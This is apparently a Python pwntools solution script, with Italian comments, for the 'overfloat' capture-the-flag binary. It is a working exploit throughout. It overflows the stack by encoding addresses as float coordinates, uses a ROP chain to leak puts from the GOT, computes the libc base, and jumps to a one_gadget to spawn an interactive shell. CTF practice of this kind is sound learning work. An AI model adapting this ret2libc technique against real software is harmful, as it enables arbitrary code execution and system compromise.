from pwn import *
from struct import pack, unpack

p = process("./overfloat")

elf = ELF("./overfloat")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi = p64(0x0000000000400a83)
puts_got = p64(elf.got["puts"])
call_puts = p64(elf.symbols["puts"])
start = p64(0x400993)


# per inviare un indirizzo abbiamo bisogno dell'invio di un intera coordinata
# per ogni coppia inviata (LAT LON) LAT andra' ad identificare la parte bassa
# di una word, mentre LON la parte alta. 
# poiche' dovremo inviare dei float definiamo le seguenti funzioni per
# inviarli correttamente
def send_addr(x):
	LAT = byte_to_float(x[:4])
	LON = byte_to_float(x[4:])
	p.sendlineafter(": ", LAT)
	p.sendlineafter(": ", LON)

def byte_to_float(x):
	if len(x) != 4:
		print("data error")
		sys.exit(0)
	return str(struct.unpack('f', bytes(x))[0])

for i in range(0xe): #PADDING
	ts = byte_to_float(chr(i)*4)
	p.sendlineafter(": ", ts)

send_addr(pop_rdi)
send_addr(puts_got)
send_addr(call_puts)
send_addr(start)

#for i in range(4):
#	ts = byte_to_float('A'*4)
#	p.sendline(ts)

p.recv()

#gdb.attach(p, '''
#	set follow-fork-mode child
#	break *main+140
#	continue
#	''')
p.sendline("done")


print(p.recvuntil("BON VOYAGE!\n"))
leak = (p.recvline()[:-1]).ljust(8, "\x00")
leak = u64(leak)
success("Leaked PUTS: " + hex(leak))

libc_base = leak - libc.symbols["puts"]
success("Leaked LIBC_START: " + hex(libc_base))

#p.interactive()

for i in range(0xe): #PADDING
	ts = byte_to_float(chr(i)*4)
	p.sendlineafter(": ", ts)

one_gadget = libc_base + 0x4484f;
success("Running One_Gadget at: " + hex(one_gadget))
send_addr(p64(one_gadget))


p.sendline("done")
p.interactive()